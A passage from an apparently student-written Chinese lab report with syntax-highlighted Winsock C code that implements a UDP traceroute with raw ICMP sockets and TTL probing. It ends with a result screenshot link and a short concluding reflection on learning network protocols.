    udp_header = (UdpHeader *) udp_data;
    udp_header-&gt;checksum = <span class="hljs-number">0</span>;
    udp_header-&gt;length = <span class="hljs-number">8</span>;
    udp_header-&gt;source_port=htons(<span class="hljs-number">33434</span>);
    udp_header-&gt;dest_port=htons(<span class="hljs-number">33434</span>);
}

<span class="hljs-comment">/*
  创建 ICMP Socket, 发送 UDP 数据包，接收回应并处理
 */</span>
<span class="hljs-comment">// create socket to receive ICMP reply</span>
    SOCKET sock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_ICMP, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>,
                        WSA_FLAG_OVERLAPPED);
    
    SOCKADDR_IN server_addr, from;
    <span class="hljs-keyword">int</span> fromlen = <span class="hljs-keyword">sizeof</span>(from);
    <span class="hljs-built_in">memset</span>(&amp;server_addr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
    server_addr.sin_port = htons(<span class="hljs-number">33434</span>);
   
    <span class="hljs-comment">// Set the receive and send timeout values to a second</span>
    timeout = <span class="hljs-number">1000</span>;
    ret = setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (<span class="hljs-keyword">char</span> *)&amp;timeout,
                     <span class="hljs-keyword">sizeof</span>(timeout));
    <span class="hljs-keyword">if</span> (ret == SOCKET_ERROR) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"setsockopt(SO_RCVTIMEO) failed: %d\n"</span>, WSAGetLastError());
        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    }
    timeout = <span class="hljs-number">1000</span>;
    ret = setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (<span class="hljs-keyword">char</span> *)&amp;timeout,
                     <span class="hljs-keyword">sizeof</span>(timeout));
    <span class="hljs-keyword">if</span> (ret == SOCKET_ERROR) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"setsockopt(SO_SNDTIMEO) failed: %d\n"</span>, WSAGetLastError());
        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    }

    <span class="hljs-comment">// bind to the port 33434</span>
    <span class="hljs-keyword">int</span> err = bind(sock, (SOCKADDR *)&amp;server_addr, <span class="hljs-keyword">sizeof</span>(SOCKADDR));
     <span class="hljs-keyword">if</span> (err != <span class="hljs-number">0</span>) {
        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"bind with error: %d\n"</span>, WSAGetLastError());
        <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;
    }

    <span class="hljs-keyword">for</span> (ttl = <span class="hljs-number">1</span>; ((ttl &lt; maxhops) &amp;&amp; (!done)); ttl++) {
        <span class="hljs-keyword">int</span> bwrote;
        <span class="hljs-comment">// Set the time to live option on the socket</span>
        set_ttl(sockRaw, ttl);
        <span class="hljs-comment">// Fill in some more data in the UDP header</span>
        ((UdpHeader *)udp_data)-&gt;length = <span class="hljs-number">8</span>;
        ((UdpHeader *)udp_data)-&gt;dest_port = htons(<span class="hljs-number">33434</span>);
        ((UdpHeader *)udp_data)-&gt;source_port = htons(<span class="hljs-number">33434</span>);
        ((UdpHeader *)udp_data)-&gt;checksum =
            checksum((USHORT *)udp_data, datasize);
        <span class="hljs-comment">// Send the UDP packet to the destination</span>
        bwrote = sendto(sockRaw, udp_data, datasize, <span class="hljs-number">0</span>, (SOCKADDR *)&amp;dest,
                        <span class="hljs-keyword">sizeof</span>(dest));
        <span class="hljs-keyword">if</span> (bwrote == SOCKET_ERROR) {
            <span class="hljs-keyword">if</span> (WSAGetLastError() == WSAETIMEDOUT) {
                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%2d  Send request timed out.\n"</span>, ttl);
                <span class="hljs-keyword">continue</span>;
            }
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"sendto() failed: %d\n"</span>, WSAGetLastError());
            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
        }
        <span class="hljs-comment">// Read a packet back from the destination or a router along the way.</span>
        ret = recvfrom(sock, recvbuf, MAX_PACKET, <span class="hljs-number">0</span>,
                       (struct sockaddr *)&amp;from, &amp;fromlen);
        <span class="hljs-keyword">if</span> (ret == SOCKET_ERROR) {
            <span class="hljs-keyword">if</span> (WSAGetLastError() == WSAETIMEDOUT) {
                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%2d  Receive Request timed out.\n"</span>, ttl);
                <span class="hljs-keyword">continue</span>;
            }
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"recvfrom() failed: %d\n"</span>, WSAGetLastError());
            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
        }
        <span class="hljs-comment">/* Decode the response to see if the ICMP response is from a router
         * along the way or whether it has reached the destination. */</span>
        done = decode_resp(recvbuf, ret, &amp;from, ttl);
        Sleep(<span class="hljs-number">1000</span>);
    }

</div></code></pre>
<p>运行结果：</p>
<p><a href="https://imgtu.com/i/IcAKzT"><img src="https://z3.ax1x.com/2021/11/14/IcAKzT.md.png" alt="udp traceroute result"></a></p>
<h2 id="%E6%80%BB%E7%BB%93">总结</h2>
<p>通过本次实验，我对 TCP、UDP、ICMP 等协议有了更深的了解，为编写高质量的网络应用程序打下了坚实的基础。同时，对于网络编程、Socket API 的使用也得到了进一步的锻炼，增强了 Coding 能力。</p>

</body>
</html>
